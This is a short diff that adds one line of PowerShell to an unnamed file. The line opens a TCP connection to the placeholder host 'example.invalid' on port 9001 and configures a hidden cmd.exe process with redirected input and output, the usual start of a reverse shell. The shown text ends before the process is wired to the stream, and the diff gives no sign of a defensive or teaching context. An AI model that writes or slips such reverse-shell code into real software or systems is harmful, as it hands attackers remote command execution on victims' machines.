@@ -1,0 +1,2 @@
+$c = New-Object System.Net.Sockets.TCPClient('example.invalid',9001); $s = $c.GetStream(); $p = New-Object System.Diagnostics.Process; $p.StartInfo.FileName = "cmd.exe"; $p.StartInfo.RedirectStandardInput = $true; $p.StartInfo.RedirectStandardOutput = $true; $p.StartInfo.UseShellExecute = $false; $p.StartInfo.CreateNoWindow = $true
+
